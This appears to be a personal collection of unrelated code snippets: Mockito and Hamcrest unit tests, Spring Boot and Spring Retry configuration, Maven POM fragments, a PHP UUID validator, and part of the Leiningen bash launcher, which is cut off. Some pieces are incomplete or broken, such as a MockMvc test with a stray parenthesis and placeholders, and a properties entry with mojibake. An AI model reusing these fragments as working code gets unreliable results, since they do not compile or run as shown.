        }).when(daoMock).updateEmail(any(Customer.class), any(String.class));
        // calling the method under test
        Customer customer = service.changeEmail("old@test.com", "new@test.com");
        //some asserts
        assertThat(customer, is(notNullValue()));
        assertThat(customer.getEmail(), is(equalTo("new@test.com")));
    }
    @Test(expected = RuntimeException.class)
    public void testUpdate_throwsException() {
        doThrow(RuntimeException.class).when(daoMock).updateEmail(any(Customer.class), any(String.class));
        // calling the method under test
        Customer customer = service.changeEmail("old@test.com", "new@test.com");
    }
}
--------------------------------------------------------------------------------------------------------
package com.tdd;
import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.*;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
public class CustomerServiceTest {
    @Mock
    private CustomerDao daoMock;
    @InjectMocks
    private CustomerService service;
    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }
    @Test
    public void test() {
        when(daoMock.save(any(Customer.class))).thenReturn(true);
        Customer customer=new Customer();
        assertThat(service.addCustomer(customer), is(true));
        //verify that the save method has been invoked
        verify(daoMock).save(any(Customer.class));
        //the above is similar to :  verify(daoMock, times(1)).save(any(Customer.class));
        //verify that the exists method is invoked one time
        verify(daoMock, times(1)).exists(anyString());
        //verify that the delete method has never been  invoked
        verify(daoMock, never()).delete(any(Customer.class));
    }
}
--------------------------------------------------------------------------------------------------------
package com.service;
import static org.hamcrest.CoreMatchers.*;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.verify;
import org.junit.Test;
import org.mockito.ArgumentCaptor;
import org.mockito.Captor;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import com.dao.CustomerDao;
import com.entity.Customer;
public class CustomerServiceTest {
    @Mock
    private CustomerDao doaMock;
    @InjectMocks
    private CustomerService service;
    @Captor
    private ArgumentCaptor<Customer> customerArgument;
    public CustomerServiceTest() {
        MockitoAnnotations.initMocks(this);
    }
    @Test
    public void testRegister() {
        //Requirement: we want to register a new customer. Every new customer should be assigned a random token before saving in the database.
        service.register(new Customer());
        //captures the argument which was passed in to save method.
        verify(doaMock).save(customerArgument.capture());
        //make sure a token is assigned by the register method before saving.
        assertThat(customerArgument.getValue().getToken(), is(notNullValue()));
    }
}
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.CoreMatchers.is;
import static org.junit.Assert.assertThat;
import static org.mockito.Mockito.*;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.MockitoAnnotations;
import org.mockito.Spy;
public class CustomerServiceTestV2 {
    @Spy
    private CustomerDaoImpl daoSpy;
    @InjectMocks
    private CustomerService service;
    @Before
    public void setUp() throws Exception {
        MockitoAnnotations.initMocks(this);
    }
    @Test
    public void test() {
        Customer customer = new Customer();
        assertThat(service.addCustomer(customer), is(false));
        verify(daoSpy).save(any(Customer.class));
        verify(daoSpy, times(1)).exists(anyString());
        verify(daoSpy, never()).delete(any(Customer.class));
    }
}
--------------------------------------------------------------------------------------------------------
package org.baeldung.hamcrest;

import org.junit.Test;

import java.util.*;

import static org.baeldung.hamcrest.IsPositiveInteger.isAPositiveInteger;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.*;
import static org.hamcrest.beans.HasProperty.hasProperty;
import static org.hamcrest.beans.HasPropertyWithValue.hasProperty;
import static org.hamcrest.beans.SamePropertyValuesAs.samePropertyValuesAs;
import static org.hamcrest.collection.IsArrayContaining.hasItemInArray;
import static org.hamcrest.collection.IsArrayContainingInAnyOrder.arrayContainingInAnyOrder;
import static org.hamcrest.collection.IsArrayContainingInOrder.arrayContaining;
import static org.hamcrest.collection.IsArrayWithSize.arrayWithSize;
import static org.hamcrest.collection.IsCollectionWithSize.hasSize;
import static org.hamcrest.collection.IsEmptyCollection.empty;
import static org.hamcrest.collection.IsIn.isIn;
import static org.hamcrest.collection.IsIn.isOneOf;
import static org.hamcrest.collection.IsIterableContainingInAnyOrder.containsInAnyOrder;
import static org.hamcrest.collection.IsIterableContainingInOrder.contains;
import static org.hamcrest.collection.IsMapContaining.hasEntry;
import static org.hamcrest.collection.IsMapContaining.hasKey;
import static org.hamcrest.collection.IsMapContaining.hasValue;
import static org.hamcrest.core.AllOf.allOf;
import static org.hamcrest.core.AnyOf.anyOf;
import static org.hamcrest.core.Every.everyItem;
import static org.hamcrest.core.Is.is;
import static org.hamcrest.core.IsInstanceOf.instanceOf;
import static org.hamcrest.core.IsNot.not;
import static org.hamcrest.core.IsNull.notNullValue;
import static org.hamcrest.core.IsSame.sameInstance;
import static org.hamcrest.core.StringContains.containsString;
import static org.hamcrest.core.StringEndsWith.endsWith;
import static org.hamcrest.core.StringStartsWith.startsWith;
import static org.hamcrest.object.HasToString.hasToString;
import static org.hamcrest.object.IsCompatibleType.typeCompatibleWith;
import static org.hamcrest.text.IsEmptyString.isEmptyOrNullString;
import static org.hamcrest.text.IsEmptyString.isEmptyString;
import static org.hamcrest.text.IsEqualIgnoringCase.equalToIgnoringCase;
import static org.hamcrest.text.IsEqualIgnoringWhiteSpace.equalToIgnoringWhiteSpace;
import static org.hamcrest.text.StringContainsInOrder.stringContainsInOrder;

public class HamcrestMatcherUnitTest {
	@Test
	public void given2Strings_whenEqual_thenCorrect() {
		String a = "foo";
		String b = "FOO";
		assertThat(a, equalToIgnoringCase(b));
	}

	@Test
	public void givenBean_whenHasValue_thenCorrect() {
		Person person = new Person("Baeldung", "New York");
		assertThat(person, hasProperty("name"));
	}

	@Test
	public void givenBean_whenHasCorrectValue_thenCorrect() {
		Person person = new Person("Baeldung", "New York");
		assertThat(person, hasProperty("address", equalTo("New York")));
	}

	@Test
	public void given2Beans_whenHavingSameValues_thenCorrect() {
		Person person1 = new Person("Baeldung", "New York");
		Person person2 = new Person("Baeldung", "New York");
		assertThat(person1, samePropertyValuesAs(person2));
	}

	@Test
	public void givenAList_whenChecksSize_thenCorrect() {
		List<String> hamcrestMatchers = Arrays.asList("collections", "beans",
				"text", "number");
		assertThat(hamcrestMatchers, hasSize(4));
	}

	@Test
	public void givenArray_whenChecksSize_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(hamcrestMatchers, arrayWithSize(4));
	}

	@Test
	public void givenAListAndValues_whenChecksListForGivenValues_thenCorrect() {
		List<String> hamcrestMatchers = Arrays.asList("collections", "beans",
				"text", "number");
		assertThat(hamcrestMatchers,
				containsInAnyOrder("beans", "text", "collections", "number"));
	}

	@Test
	public void givenAListAndValues_whenChecksListForGivenValuesWithOrder_thenCorrect() {
		List<String> hamcrestMatchers = Arrays.asList("collections", "beans",
				"text", "number");
		assertThat(hamcrestMatchers,
				contains("collections", "beans", "text", "number"));
	}

	@Test
	public void givenArrayAndValue_whenValueFoundInArray_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(hamcrestMatchers, hasItemInArray("text"));

	}

	@Test
	public void givenValueAndArray_whenValueIsOneOfArrayElements_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat("text", isOneOf(hamcrestMatchers));

	}

	@Test
	public void givenArrayAndValues_whenValuesFoundInArray_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(
				hamcrestMatchers,
				arrayContainingInAnyOrder("beans", "collections", "number",
						"text"));

	}

	@Test
	public void givenArrayAndValues_whenValuesFoundInArrayInOrder_thenCorrect() {
		String[] hamcrestMatchers = { "collections", "beans", "text", "number" };
		assertThat(hamcrestMatchers,
				arrayContaining("collections", "beans", "text", "number"));

	}

	@Test
	public void givenCollection_whenEmpty_thenCorrect() {
		List<String> emptyList = new ArrayList<>();
		assertThat(emptyList, empty());

	}

	@Test
	public void givenValueAndArray_whenValueFoundInArray_thenCorrect() {
		String[] array = new String[] { "collections", "beans", "text",
				"number" };
		assertThat("beans", isIn(array));

	}

	@Test
	public void givenMapAndKey_whenKeyFoundInMap_thenCorrect() {
		Map<String, String> map = new HashMap<>();
		map.put("blogname", "baeldung");
		assertThat(map, hasKey("blogname"));
	}

	@Test
	public void givenMapAndEntry_whenEntryFoundInMap_thenCorrect() {
		Map<String, String> map = new HashMap<>();
		map.put("blogname", "baeldung");
		assertThat(map, hasEntry("blogname", "baeldung"));
	}

	@Test
	public void givenMapAndValue_whenValueFoundInMap_thenCorrect() {
		Map<String, String> map = new HashMap<>();
		map.put("blogname", "baeldung");
		assertThat(map, hasValue("baeldung"));
	}

	@Test
	public void givenString_whenEmpty_thenCorrect() {
		String str = "";
		assertThat(str, isEmptyString());
	}

	@Test
	public void givenString_whenEmptyOrNull_thenCorrect() {
		String str = null;
		assertThat(str, isEmptyOrNullString());
	}

	@Test
	public void given2Strings_whenEqualRegardlessWhiteSpace_thenCorrect() {
		String str1 = "text";
		String str2 = " text ";
		assertThat(str1, equalToIgnoringWhiteSpace(str2));
	}

	@Test
	public void givenString_whenContainsGivenSubstring_thenCorrect() {
		String str = "calligraphy";
		assertThat(str, stringContainsInOrder(Arrays.asList("call", "graph")));
	}

	@Test
	public void givenBean_whenToStringReturnsRequiredString_thenCorrect() {
		Person person = new Person("Barrack", "Washington");
		String str = person.toString();
		assertThat(person, hasToString(str));
	}

	@Test
	public void given2Classes_whenOneInheritsFromOther_thenCorrect() {
		assertThat(Cat.class, typeCompatibleWith(Animal.class));
	}

	
	@Test
	public void given2Strings_whenIsEqualRegardlessWhiteSpace_thenCorrect() {
		String str1 = "text";
		String str2 = " text ";
		assertThat(str1, is(equalToIgnoringWhiteSpace(str2)));
	}

	@Test
	public void given2Strings_whenIsNotEqualRegardlessWhiteSpace_thenCorrect() {
		String str1 = "text";
		String str2 = " texts ";
		assertThat(str1, not(equalToIgnoringWhiteSpace(str2)));
	}

	@Test
	public void given2Strings_whenNotEqual_thenCorrect() {
		String str1 = "text";
		String str2 = "texts";
		assertThat(str1, not(str2));
	}

	@Test
	public void given2Strings_whenIsEqual_thenCorrect() {
		String str1 = "text";
		String str2 = "text";
		assertThat(str1, is(str2));
	}

	@Test
	public void givenAStrings_whenContainsAnotherGivenString_thenCorrect() {
		String str1 = "calligraphy";
		String str2 = "call";
		assertThat(str1, containsString(str2));
	}

	@Test
	public void givenAString_whenEndsWithAnotherGivenString_thenCorrect() {
		String str1 = "calligraphy";
		String str2 = "phy";
		assertThat(str1, endsWith(str2));
	}

	@Test
	public void givenAString_whenStartsWithAnotherGivenString_thenCorrect() {
		String str1 = "calligraphy";
		String str2 = "call";
		assertThat(str1, startsWith(str2));
	}

	@Test
	public void given2Objects_whenSameInstance_thenCorrect() {
		Cat cat = new Cat();
		assertThat(cat, sameInstance(cat));
	}

	@Test
	public void givenAnObject_whenInstanceOfGivenClass_thenCorrect() {
		Cat cat = new Cat();
		assertThat(cat, instanceOf(Cat.class));
	}

	@Test
	public void givenList_whenEachElementGreaterThan0_thenCorrect() {
		List<Integer> list = Arrays.asList(1, 2, 3);
		int baseCase = 0;
		assertThat(list, everyItem(greaterThan(baseCase)));
	}

	@Test
	public void givenString_whenNotNull_thenCorrect() {
		String str = "notnull";
		assertThat(str, notNullValue());
	}

	@Test
	public void givenString_whenMeetsAnyOfGivenConditions_thenCorrect() {
		String str = "calligraphy";
		String start = "call";
		String end = "foo";
		assertThat(str, anyOf(startsWith(start), containsString(end)));
	}

	@Test
	public void givenString_whenMeetsAllOfGivenConditions_thenCorrect() {
		String str = "calligraphy";
		String start = "call";
		String end = "phy";
		assertThat(str, allOf(startsWith(start), endsWith(end)));
	}

	@Test
	public void givenInteger_whenAPositiveValue_thenCorrect() {
		int num = 1;
		assertThat(num, isAPositiveInteger());
	}

	@Test
	public void givenAnInteger_whenGreaterThan0_thenCorrect() {
		int num = 1;
		assertThat(num, greaterThan(0));
	}

	@Test
	public void givenAnInteger_whenGreaterThanOrEqTo5_thenCorrect() {
		int num = 5;
		assertThat(num, greaterThanOrEqualTo(5));
	}

	@Test
	public void givenAnInteger_whenLessThan0_thenCorrect() {
		int num = -1;
		assertThat(num, lessThan(0));
	}

	@Test
	public void givenAnInteger_whenLessThanOrEqTo5_thenCorrect() {
		assertThat(-1, lessThanOrEqualTo(5));
	}

	@Test
	public void givenADouble_whenCloseTo_thenCorrect() {
		assertThat(1.2, closeTo(1, 0.5));
	}
}
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableRetry
@EnableAspectJAutoProxy
@ImportResource("classpath:/retryadvice.xml")
public class AppConfig { ... }
--------------------------------------------------------------------------------------------------------

import java.sql.Connection;
import java.sql.SQLException;

import javax.sql.DataSource;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.Order;
import org.springframework.jdbc.datasource.AbstractDataSource;
import org.springframework.retry.annotation.Backoff;
import org.springframework.retry.annotation.EnableRetry;
import org.springframework.retry.annotation.Retryable;

@SpringBootApplication
@EnableRetry
public class DemoApplication {

    @Order(Ordered.HIGHEST_PRECEDENCE)
    private class RetryableDataSourceBeanPostProcessor implements BeanPostProcessor {
        @Override
        public Object postProcessBeforeInitialization(Object bean, String beanName)
                throws BeansException {
            if (bean instanceof DataSource) {
                bean = new RetryableDataSource((DataSource)bean);
            }
            return bean;
        }

        @Override
        public Object postProcessAfterInitialization(Object bean, String beanName)
                throws BeansException {
            return bean;
        }
    }

    public static void main(String[] args) {
        SpringApplication.run(DemoApplication.class, args);
    }

    @Bean
    public BeanPostProcessor dataSouceWrapper() {
        return new RetryableDataSourceBeanPostProcessor();
    }
}

class RetryableDataSource extends AbstractDataSource {

    private DataSource delegate;

    public RetryableDataSource(DataSource delegate) {
        this.delegate = delegate;
    }

    @Override
    @Retryable(maxAttempts=10, backoff=@Backoff(multiplier=2.3, maxDelay=30000))
    public Connection getConnection() throws SQLException {
        return delegate.getConnection();
    }

    @Override
    @Retryable(maxAttempts=10, backoff=@Backoff(multiplier=2.3, maxDelay=30000))
    public Connection getConnection(String username, String password)
            throws SQLException {
        return delegate.getConnection(username, password);
    }
}
--------------------------------------------------------------------------------------------------------
@ExceptionHandler(MethodArgumentNotValidException.class)
@ResponseBody
@ResponseStatus(HttpStatus.BAD_REQUEST)
public Map<String, String> validationExceptionCaught(
        MethodArgumentNotValidException e) {
    return Collections.singletonMap("message", messageSource.getMessage(
            e.getBindingResult().getFieldError().getDefaultMessage()));
}
 
/**
 * for debugging
 */
@ExceptionHandler(MethodArgumentTypeMismatchException.class)
@ResponseBody
@ResponseStatus(HttpStatus.BAD_REQUEST)
public Map<String, String> validationExceptionCaught(
        MethodArgumentTypeMismatchException e) {
    return Collections.singletonMap("message", e.getMessage());
}
 
@ExceptionHandler(ConstraintViolationException.class)
@ResponseBody
@ResponseStatus(HttpStatus.BAD_REQUEST)
public Map<String, String> validationExceptionCaught(
        ConstraintViolationException e) {
    return Collections.singletonMap("message",
            messageSource.getMessage(
                    e.getConstraintViolations().stream().findFirst()
                            .map(ConstraintViolation::getMessageTemplate)
                            .orElse(e.getMessage())));
}
--------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
    <entry key="app.name">test de regroupement de ressources invoquÃ© par {0}</entry>
</properties>
--------------------------------------------------------------------------------------------------------
   <scm>
      <connection>scm:svn:svn+ssh://janey@svn.java.net/hk2~svn/tags/osgi-resource-locator-1.0.1</connection>
      <developerConnection>scm:svn:svn+ssh://janey@svn.java.net/hk2~svn/tags/osgi-resource-locator-1.0.1</developerConnection>             
    </scm>
	
	   <!-- override distributionManagement from parent pom -->
    <distributionManagement>
        <!-- our internal staging repository, to be pushed to http://download.java.net/maven/glassfish/ -->
        <repository>            
            <uniqueVersion>false</uniqueVersion>
            <!-- the ID maps to ~/.m2/settings.xml, so don't change the ID -->
            <id>rator.sfbay</id>
            <url>dav:http://glassfish-maven-repository.us.oracle.com/maven/repositories/glassfish/</url>
        </repository>
    </distributionManagement>
--------------------------------------------------------------------------------------------------------
    <profiles>
        <profile>
            <id>jdk5</id>
            <activation>
                <activeByDefault>false</activeByDefault>
                <jdk>1.5</jdk>
            </activation>
            <dependencies>
                <dependency>
                    <groupId>javax.xml.stream</groupId>
                    <artifactId>stax-api</artifactId>
                    <scope>provided</scope>
                </dependency>
            </dependencies>
        </profile>
        <profile>
            <id>jdk8-</id>
            <activation>
                <jdk>(,1.8)</jdk>
                <activeByDefault>false</activeByDefault>
            </activation>
            <build>
                <plugins>
                    <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <executions>
                                <execution>
                                    <id>default-testCompile</id>
                                    <configuration>
                                          <testExcludes>
                                              <testExclude>**/lambda/*</testExclude>
                                          </testExcludes>
                                    </configuration>
                                </execution>
                          </executions>
                    </plugin>
                </plugins>
            </build>
        </profile>
        <profile>
            <id>jdk8+</id>
            <activation>
                <jdk>[1.8,)</jdk>
                <activeByDefault>false</activeByDefault>
            </activation>
            <build>
                <plugins>
                    <plugin>
                          <groupId>org.apache.maven.plugins</groupId>
                          <artifactId>maven-compiler-plugin</artifactId>
                          <executions>
                                <execution>
                                    <id>default-testCompile</id>
                                    <configuration>
                                          <source>1.8</source>
                                          <target>1.8</target>
                                    </configuration>
                                </execution>
                          </executions>
                    </plugin>
                </plugins>
            </build>
        </profile>
    </profiles>
--------------------------------------------------------------------------------------------------------
fsutil hardlink list
--------------------------------------------------------------------------------------------------------
@SpringBootApplication
@ComponentScan(
    excludeFilters = {
        // Exclude the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = DefaultMessageService.class),
        // Exclude the default boot application or it's
        // @ComponentScan will pull in the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = IntegrationTestDemo.class)
    }
)
--------------------------------------------------------------------------------------------------------
<?php
/**
 * Check if a given string is a valid UUID
 * 
 * @param   string  $uuid   The string to check
 * @return  boolean
 */
function isValidUuid( $uuid ) {
    
    if (!is_string($uuid) || (preg_match('/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/', $uuid) !== 1)) {
        return false;
    }
    return true;
}
--------------------------------------------------------------------------------------------------------
<dependencies>
    <!-- Other dependencies... -->
    <!-- Add dependency for Rest Assured (has to go before JUnit to work) -->
    <dependency>
        <groupId>io.rest-assured</groupId>
        <artifactId>rest-assured</artifactId>
        <version>3.0.6</version>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>junit</groupId>
        <artifactId>junit</artifactId>
        <version>4.10</version>
        <scope>test</scope>
    </dependency>
    <!-- Other dependencies... -->
</dependencies>

package Tests.GameTests;

import Tests.TestModel;
import com.github.fge.jsonschema.cfg.ValidationConfiguration;
import com.github.fge.jsonschema.main.JsonSchemaFactory;
import org.testng.annotations.Test;

import static com.github.fge.jsonschema.SchemaVersion.DRAFTV4;
import static io.restassured.RestAssured.when;
import static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;

public class GameTest extends TestModel {

    @Test
    public void testGameSchema() {
        JsonSchemaFactory jsonSchemaFactory = JsonSchemaFactory.newBuilder().
            setValidationConfiguration(ValidationConfiguration.
            newBuilder().
            setDefaultVersion(DRAFTV4).freeze()).freeze();

        when().
            get("/games/114").
            then().
            assertThat().
            body(matchesJsonSchemaInClasspath("game_schema.json").
                    using(jsonSchemaFactory));
    }
}

@SpringBootApplication
@ComponentScan(
    excludeFilters = {
        // Exclude the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = DefaultMessageService.class),
        // Exclude the default boot application or it's
        // @ComponentScan will pull in the default message service
        @ComponentScan.Filter(type = FilterType.ASSIGNABLE_TYPE, value = IntegrationTestDemo.class)
    }
)
public class TestConfig {

    @Bean
    // Define our own test message service
    MessageService mockMessageService() {
        return new MessageService() {
            @Override
            public String getMessage() {
                return "This is a test message";
            }
        };
    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(classes = {
 ... // any required Spring config
)
@WebAppConfiguration
public class RestControllerTest {

    @Autowired
    private WebApplicationContext context;

    private MockMvc mockMvc;

    @Before
    public void setup() {
        mockMvc = MockMvcBuilders.webAppContextSetup(context).build();
    }


    @Test
    public void getUserList() throws Exception {
        mockMvc.perform(get("/user"))
            .andExpect(status().isOk())
            .andExpect(content().contentType("application/json;charset=UTF-8")) 
            .andExpect(content().encoding("UTF-8"))
            .andExpect(jsonPath("$", hasSize(8)))
            .andExpect(jsonPath("$[0].id").exists())
            .andExpect(jsonPath("$[0].alias").exists())
            .andExpect(jsonPath("$[0].name").exists())
        );
    }
}
--------------------------------------------------------------------------------------------------------
import org.junit.*;
import org.junit.runner.*;
import org.springframework.beans.factory.annotation.*;
import org.springframework.boot.test.autoconfigure.json.*;
import org.springframework.boot.test.context.*;
import org.springframework.boot.test.json.*;
import org.springframework.test.context.junit4.*;

import static org.assertj.core.api.Assertions.*;

@RunWith(SpringRunner.class)
@JsonTest
public class MyJsonTests {

	@Autowired
	private JacksonTester<VehicleDetails> json;

	@Test
	public void testSerialize() throws Exception {
		VehicleDetails details = new VehicleDetails("Honda", "Civic");
		// Assert against a `.json` file in the same package as the test
		assertThat(this.json.write(details)).isEqualToJson("expected.json");
		// Or use JSON path based assertions
		assertThat(this.json.write(details)).hasJsonPathStringValue("@.make");
		assertThat(this.json.write(details)).extractingJsonPathStringValue("@.make")
				.isEqualTo("Honda");
	}

	@Test
	public void testDeserialize() throws Exception {
		String content = "{\"make\":\"Ford\",\"model\":\"Focus\"}";
		assertThat(this.json.parse(content))
				.isEqualTo(new VehicleDetails("Ford", "Focus"));
		assertThat(this.json.parseObject(content).getMake()).isEqualTo("Ford");
	}
}
--------------------------------------------------------------------------------------------------------
import org.junit.*;
import org.junit.runner.*;
import org.springframework.beans.factory.annotation.*;
import org.springframework.boot.test.autoconfigure.web.servlet.*;
import org.springframework.boot.test.mock.mockito.*;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.BDDMockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@RunWith(SpringRunner.class)
@WebMvcTest(UserVehicleController.class)
public class MyControllerTests {

	@Autowired
	private MockMvc mvc;

	@MockBean
	private UserVehicleService userVehicleService;

	@Test
	public void testExample() throws Exception {
		given(this.userVehicleService.getVehicleDetails("sboot"))
				.willReturn(new VehicleDetails("Honda", "Civic"));
		this.mvc.perform(get("/sboot/vehicle").accept(MediaType.TEXT_PLAIN))
				.andExpect(status().isOk()).andExpect(content().string("Honda Civic"));
	}
}
--------------------------------------------------------------------------------------------------------
import com.gargoylesoftware.htmlunit.*;
import org.junit.*;
import org.junit.runner.*;
import org.springframework.beans.factory.annotation.*;
import org.springframework.boot.test.autoconfigure.web.servlet.*;
import org.springframework.boot.test.mock.mockito.*;

import static org.assertj.core.api.Assertions.*;
import static org.mockito.BDDMockito.*;

@RunWith(SpringRunner.class)
@WebMvcTest(UserVehicleController.class)
public class MyHtmlUnitTests {

	@Autowired
	private WebClient webClient;

	@MockBean
	private UserVehicleService userVehicleService;

	@Test
	public void testExample() throws Exception {
		given(this.userVehicleService.getVehicleDetails("sboot"))
				.willReturn(new VehicleDetails("Honda", "Civic"));
		HtmlPage page = this.webClient.getPage("/sboot/vehicle.html");
		assertThat(page.getBody().getTextContent()).isEqualTo("Honda Civic");
	}
}

@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT)
public class SampleWebClientTests {

	@Autowired
	private TestRestTemplate template;

	@Test
	public void testRequest() {
		HttpHeaders headers = this.template.getForEntity("/example", String.class).getHeaders();
		assertThat(headers.getLocation()).hasHost("other.example.com");
	}

	@TestConfiguration
	static class Config {

		@Bean
		public RestTemplateBuilder restTemplateBuilder() {
			return new RestTemplateBuilder().setConnectTimeout(Duration.ofSeconds(1))
					.setReadTimeout(Duration.ofSeconds(1));
		}
	}
}
--------------------------------------------------------------------------------------------------------
#!/usr/bin/env bash

# Ensure this file is executable via `chmod a+x lein`, then place it
# somewhere on your $PATH, like ~/bin. The rest of Leiningen will be
# installed upon first run into the ~/.lein/self-installs directory.

export LEIN_VERSION="2.6.1"

case $LEIN_VERSION in
    *SNAPSHOT) SNAPSHOT="YES" ;;
    *) SNAPSHOT="NO" ;;
esac

if [[ "$OSTYPE" == "cygwin" ]] || [[ "$OSTYPE" == "msys" ]]; then
    delimiter=";"
else
    delimiter=":"
fi

if [[ "$OSTYPE" == "cygwin" ]]; then
  cygwin=true
else
  cygwin=false
fi

function command_not_found {
    >&2 echo "Leiningen coundn't find $1 in your \$PATH ($PATH), which is required."
    exit 1
}

function make_native_path {
    # ensure we have native paths
    if $cygwin && [[ "$1"  == /* ]]; then
    echo -n "$(cygpath -wp "$1")"
    elif [[ "$OSTYPE" == "msys" && "$1"  == /?/* ]]; then
    echo -n "$(sh -c "(cd $1 2</dev/null && pwd -W) || echo $1 | sed 's/^\\/\([a-z]\)/\\1:/g'")"
    else
    echo -n "$1"
    fi
}

#  usage : add_path PATH_VAR [PATH]...
function add_path {
    local path_var="$1"
    shift
    while [ -n "$1" ];do
        # http://bashify.com/?Useful_Techniques:Indirect_Variables:Indirect_Assignment
        if [[ -z ${!path_var} ]]; then
          export ${path_var}="$(make_native_path "$1")"
        else
          export ${path_var}="${!path_var}${delimiter}$(make_native_path "$1")"
        fi
    shift
    done
}

function download_failed_message {
    echo "Failed to download $1 (exit code $2)"
    echo "It's possible your HTTP client's certificate store does not have the"
    echo "correct certificate authority needed. This is often caused by an"
    echo "out-of-date version of libssl. It's also possible that you're behind a"
    echo "firewall and haven't set HTTP_PROXY and HTTPS_PROXY."
}

function self_install {
  if [ -r "$LEIN_JAR" ]; then
    echo "The self-install jar already exists at $LEIN_JAR."
    echo "If you wish to re-download, delete it and rerun \"$0 self-install\"."
    exit 1
  fi
  echo "Downloading Leiningen to $LEIN_JAR now..."
  mkdir -p "$(dirname "$LEIN_JAR")"
  LEIN_URL="https://github.com/technomancy/leiningen/releases/download/$LEIN_VERSION/leiningen-$LEIN_VERSION-standalone.zip"
  $HTTP_CLIENT "$LEIN_JAR.pending" "$LEIN_URL"
  local exit_code=$?
  if [ $exit_code == 0 ]; then
      # TODO: checksum
      mv -f "$LEIN_JAR.pending" "$LEIN_JAR"
  else
      rm "$LEIN_JAR.pending" 2> /dev/null
      download_failed_message "$LEIN_URL" "$exit_code"
      exit 1
  fi
}

function check_root {
  local -i user_id
  # Thank you for the complexity, Solaris
  if [ `uname` = "SunOS" -a -x /usr/xpg4/bin/id ]; then
    user_id=$(/usr/xpg4/bin/id -u 2>/dev/null || echo 0)
  else
    user_id=$(id -u 2>/dev/null || echo 0)
  fi
  [ $user_id -eq 0 -a "$LEIN_ROOT" = "" ] && return 0
  return 1
}

if check_root; then
    echo "WARNING: You're currently running as root; probably by accident."
    echo "Press control-C to abort or Enter to continue as root."
    echo "Set LEIN_ROOT to disable this warning."
    read _
fi

NOT_FOUND=1
ORIGINAL_PWD="$PWD"
while [ ! -r "$PWD/project.clj" ] && [ "$PWD" != "/" ] && [ $NOT_FOUND -ne 0 ]
do
    cd ..
    if [ "$(dirname "$PWD")" = "/" ]; then
        NOT_FOUND=0
        cd "$ORIGINAL_PWD"
    fi
done

export LEIN_HOME="${LEIN_HOME:-"$HOME/.lein"}"

for f in "/etc/leinrc" "$LEIN_HOME/leinrc" ".leinrc"; do
  if [ -e "$f" ]; then
    source "$f"
  fi
done

if $cygwin; then
    export LEIN_HOME=$(cygpath -w "$LEIN_HOME")
fi

LEIN_JAR="$LEIN_HOME/self-installs/leiningen-$LEIN_VERSION-standalone.jar"

# normalize $0 on certain BSDs
if [ "$(dirname "$0")" = "." ]; then
    SCRIPT="$(which "$(basename "$0")")"
    if [ -z "$SCRIPT" ]; then
        SCRIPT="$0"
    fi
else
    SCRIPT="$0"
fi

# resolve symlinks to the script itself portably
while [ -h "$SCRIPT" ] ; do
    ls=$(ls -ld "$SCRIPT")
    link=$(expr "$ls" : '.*-> \(.*\)$')
    if expr "$link" : '/.*' > /dev/null; then
        SCRIPT="$link"
    else
        SCRIPT="$(dirname "$SCRIPT"$)/$link"
    fi
done

BIN_DIR="$(dirname "$SCRIPT")"

export LEIN_JVM_OPTS="${LEIN_JVM_OPTS-"-XX:+TieredCompilation -XX:TieredStopAtLevel=1"}"

# This needs to be defined before we call HTTP_CLIENT below
if [ "$HTTP_CLIENT" = "" ]; then
    if type -p curl >/dev/null 2>&1; then
        if [ "$https_proxy" != "" ]; then
            CURL_PROXY="-x $https_proxy"
        fi
        HTTP_CLIENT="curl $CURL_PROXY -f -L -o"
    else
        HTTP_CLIENT="wget -O"
    fi
fi


# When :eval-in :classloader we need more memory
grep -E -q '^\s*:eval-in\s+:classloader\s*$' project.clj 2> /dev/null && \
    export LEIN_JVM_OPTS="$LEIN_JVM_OPTS -Xms64m -Xmx512m"

if [ -r "$BIN_DIR/../src/leiningen/version.clj" ]; then
    # Running from source checkout
    LEIN_DIR="$(dirname "$BIN_DIR")"

    # Need to use lein release to bootstrap the leiningen-core library (for aether)
    if [ ! -r "$LEIN_DIR/leiningen-core/.lein-bootstrap" ]; then
        echo "Leiningen is missing its dependencies."
        echo "Please run \"lein bootstrap\" in the leiningen-core/ directory"
        echo "with a stable release of Leiningen. See CONTRIBUTING.md for details."
        exit 1
    fi

